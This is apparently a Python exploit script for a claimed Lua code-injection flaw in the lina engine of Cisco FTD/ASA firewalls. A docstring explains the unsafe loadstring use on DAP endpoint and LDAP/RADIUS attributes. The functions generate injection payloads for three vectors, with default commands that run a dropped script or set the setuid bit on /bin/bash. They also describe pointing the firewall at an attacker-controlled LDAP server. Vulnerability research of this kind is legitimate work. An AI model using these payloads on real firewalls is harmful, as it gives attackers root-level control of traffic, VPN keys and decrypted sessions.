"""
F-FTD-83: lina Lua code injection via DAP install_endpoint_data — code exec in core FTD firewall engine
CONTROLLED ENVIRONMENT ONLY

Root cause:
  Embedded in lina binary (/usr/local/asa/bin/lina, 110MB):

  Lua code pattern (3 callsites):
    -- rebuild the attribute string: <name>=<value>
    attr = name .. "=" .. (value or "nil")
    -- install the attribute into the Lua session
    assert(loadstring(attr))()

    OR (callsite 2):
    attr = name .. "=" .. (value)
    assert(loadstring(attr))()

  `install_endpoint_data(str)` is a Lua function called FROM C CODE to install
  endpoint/session attributes into the DAP (Dynamic Access Policy) Lua context.

  DAP context:
    When AnyConnect connects, FTD lina invokes the DAP evaluation engine.
    AnyConnect sends endpoint posture data (OS, AV, registry values, etc.).
    RADIUS/LDAP AAA can also contribute session attributes (e.g., aaa.ldap.memberOf).
    Each attribute is installed via: assert(loadstring(name.."="..(value)))()

  INJECTION MECHANISM:
    `name` = attribute name (controlled by client or AAA server)
    `value` = attribute value (controlled by client or AAA server)
    `attr` = e.g., `endpoint.os.version=0 os.execute("cmd") --`
    `loadstring(attr)` compiles: endpoint.os.version = 0 \n os.execute("cmd") --
    This is valid Lua: assigns 0 to endpoint.os.version, then executes cmd.

    Injection works WITHOUT quoting around value:
      name  = "endpoint.os.version"
      value = "0 os.execute('id') --"
      attr  = "endpoint.os.version=0 os.execute('id') --"
      loadstring executes: (1) assign 0, (2) call os.execute('id'), (3) ignore rest
      → Code executed in lina process context (root or lina user)

    Third callsite DOES add quotes (endpoint.device.id):
      value = 'legit" os.execute("id") --'
      attr  = 'endpoint.device.id="legit" os.execute("id") --"'
      loadstring executes: (1) assign "legit", (2) execute id, (3) syntax error after
      → Still executes if os.execute completes before syntax error check

ATTACK VECTORS:

  Vector A — Malicious AnyConnect client:
    AnyConnect sends endpoint posture data in the CSTP protocol.
    A modified/custom AnyConnect binary sends crafted endpoint attributes:
      endpoint.os.version = "0 os.execute('/tmp/payload') --"
    lina processes this via install_endpoint_data → Lua injection → lina RCE.
    Requires: AnyConnect VPN connection (authenticated user-level access).

  Vector B — LDAP attribute injection (requires LDAP AAA configured):
    FTD configured with LDAP AAA server (aaa-server group).
    Attacker controls LDAP entry (e.g., own account or compromised LDAP).
    LDAP server returns crafted attribute value for any mapped attribute:
      e.g., memberOf value: "CN=Users,DC=corp,DC=com" os.execute('/tmp/p')--"
    lina installs LDAP attributes as aaa.ldap.* via install_endpoint_data.
    → Lua code executes in lina process.

  Vector C — RADIUS attribute injection (requires RADIUS AAA configured):
    RADIUS server returns a VSA attribute with crafted value.
    → Same Lua injection path.

IMPACT:
  lina IS the core Cisco FTD/ASA firewall process — not a web container.
  Code execution in lina means:
    - Full control over FTD packet processing
    - Ability to disable inspection, drop/forward/modify all traffic
    - Access to VPN session keys and decrypted traffic
    - Access to all management interfaces from within lina context
    - Ability to break HA (failover) by corrupting lina state
    - Persistence: lina is a long-running process that survives FDM restarts

  Unlike www shell attacks (F-FTD-67/69/70/73), lina RCE:
    - Is in the DATA PLANE, not management
    - Provides direct access to all traffic flowing through the firewall
    - Has different/potentially wider system privileges than www

NOTE ON QUOTING:
  Callsite 3 uses `endpoint.device.id` with explicit value quoting:
    attr = name.."="..'"'..value..'"'
  This is ALSO vulnerable if value contains: legit" os.execute("id") --
  The closing quote comes from the malicious value; code executes before syntax error.

  Callsites 1 and 2 have NO quoting at all:
    attr = name.."="..(value or "nil")
  Any value can inject Lua code by starting with a valid Lua literal (0, false, nil, {})
  and appending code after it.

CONFIRMED FROM BINARY:
  lina binary: /usr/local/asa/bin/lina (110MB, stripped, FTD 6.7.0-65)
  Strings confirmed:
    "assert(loadstring(attr))()"  -- 3 occurrences
    "-- This function is called from the C code"
    "-- to install endpoint attributes into the Lua context."
    "function install_endpoint_data(str)"
    "endpoint.device.id"
  Context confirms DAP Lua engine with attribute installation via loadstring.

  ASA code depot path: "//depot/sierra/9.15.1_fcs_throttle/..."

Affected: FTD 6.7.0-65 (lina binary, ASA 9.15.1)
Severity: CRITICAL — code execution in core FTD packet processing engine
Condition: AnyConnect VPN enabled (Vector A) OR LDAP/RADIUS AAA configured (B/C)
Auth required: Valid VPN user credentials for Vector A; LDAP/RADIUS control for B/C
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import struct


def gen_anyconnect_posture_inject(command="/tmp/ftd83-payload.sh"):
    """
    Generate a crafted AnyConnect CSTP endpoint posture attribute
    containing the Lua injection payload.

    In the AnyConnect CSTP protocol, endpoint posture attributes are sent
    as HTTP-like headers or in the CSTP data channel.
    Format varies by AnyConnect version; this shows the payload structure.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # The Lua injection payload
    # Uses endpoint.os.version (unquoted path, callsite 1/2)
    # Format: <value that is valid Lua start> <injected code>
    lua_payload = f'0 os.execute("{command}") --'

    print("[*] F-FTD-83: DAP Lua injection payload")
    print(f"    Attribute: endpoint.os.version")
    print(f"    Value (raw): {lua_payload}")
    print()
    print(f"    Resulting Lua executed by lina:")
    print(f"    attr = 'endpoint.os.version={lua_payload}'")
    print(f"    loadstring('endpoint.os.version={lua_payload}')()")
    print()
    print(f"    Lua execution:")
    print(f"      1. endpoint.os.version = 0  (valid assignment)")
    print(f"      2. os.execute('{command}')  (EXECUTES as lina process)")
    print(f"      3. -- (comment, rest ignored)")
    print()
    print(f"    CSTP attribute delivery (conceptual):")
    print(f"      X-CSTP-License: ...(normal CSTP headers)...")
    print(f"      X-CSTP-Endpoint-OS-Version: {lua_payload}")
    print()
    print(f"    Required: AnyConnect VPN connection, authenticated user session")
    return {
        'attribute': 'endpoint.os.version',
        'value': lua_payload,
        'resulting_lua': f'endpoint.os.version={lua_payload}'
    }


def gen_ldap_inject(attribute="aaa.ldap.memberOf", command="chmod u+s /bin/bash"):
    """
    Generate LDAP attribute value for Lua injection via install_endpoint_data.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # LDAP attribute values passed through aaa.ldap.* namespace
    # For string attributes, the unquoted path works if we start with a Lua literal
    lua_payload = f'0 os.execute("{command}") --'

    print("[*] F-FTD-83: LDAP attribute Lua injection payload")
    print(f"    LDAP attribute: {attribute}")
    print(f"    Value: {lua_payload}")
    print()
    print(f"    Setup: Configure FTD AAA to use attacker-controlled LDAP server")
    print(f"    LDAP server returns memberOf = '{lua_payload}'")
    print(f"    lina installs: assert(loadstring('aaa.ldap.memberOf={lua_payload}'))()")
    print(f"    → os.execute runs as lina process")
    return {
        'attribute': attribute,
        'value': lua_payload,
        'resulting_lua': f'{attribute}={lua_payload}'
    }


def gen_device_id_inject(command="chmod u+s /bin/bash"):
    """
    Generate endpoint.device.id Lua injection (callsite 3, quoted path).
    value must contain a closing quote to escape the surrounding quotes.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # Callsite 3: attr = name.."="..'"'..value..'"'
    # attr = 'endpoint.device.id="<value>"'
    # Inject: close the quote, execute code, start new string
    value = f'legit" os.execute("{command}") --'

    print("[*] F-FTD-83: endpoint.device.id quoted Lua injection")
    print(f"    Value: {value}")
    print(f"    Resulting Lua: endpoint.device.id=\"{value}\"")
    print(f"    = endpoint.device.id=\"legit\" os.execute(\"{command}\") --\"")
    print(f"      (1) endpoint.device.id = \"legit\"  (valid)")
    print(f"      (2) os.execute(\"{command}\")  (EXECUTES)")
    print(f"      (3) --\"  (comment)")
    return {
        'attribute': 'endpoint.device.id',
        'value': value,
        'resulting_lua': f'endpoint.device.id="legit" os.execute("{command}") --"'
    }


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-83: lina Lua code injection via DAP install_endpoint_data")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
Context: lina (ASA 9.15.1 / FTD 6.7.0-65) embeds a Lua DAP evaluation engine.
Endpoint posture attributes from AnyConnect and AAA (LDAP/RADIUS) are installed
into Lua via assert(loadstring(name.."="..(value)))(). No sanitization of value.

3 injection paths:
  A) AnyConnect endpoint posture (endpoint.os.version etc.) — authenticated VPN user
  B) LDAP attribute injection (aaa.ldap.*) — requires LDAP AAA configured
  C) endpoint.device.id (quoted variant) — same AnyConnect path, needs quote escape

Impact: Code execution in lina = code execution in core FTD firewall process.
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print("--- Vector A: AnyConnect endpoint posture ---")
        gen_anyconnect_posture_inject()
        print()
        print("--- Vector B: LDAP attribute injection ---")
        gen_ldap_inject()
        print()
        print("--- Vector C: endpoint.device.id (quoted) ---")
        gen_device_id_inject()

    elif mode == "posture":
        cmd = sys.argv[2] if len(sys.argv) > 2 else "/tmp/ftd83-payload.sh"
        gen_anyconnect_posture_inject(cmd)

    elif mode == "ldap":
        attr = sys.argv[2] if len(sys.argv) > 2 else "aaa.ldap.memberOf"
        cmd = sys.argv[3] if len(sys.argv) > 3 else "chmod u+s /bin/bash"
        gen_ldap_inject(attr, cmd)

    elif mode == "deviceid":
        cmd = sys.argv[2] if len(sys.argv) > 2 else "chmod u+s /bin/bash"
        gen_device_id_inject(cmd)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
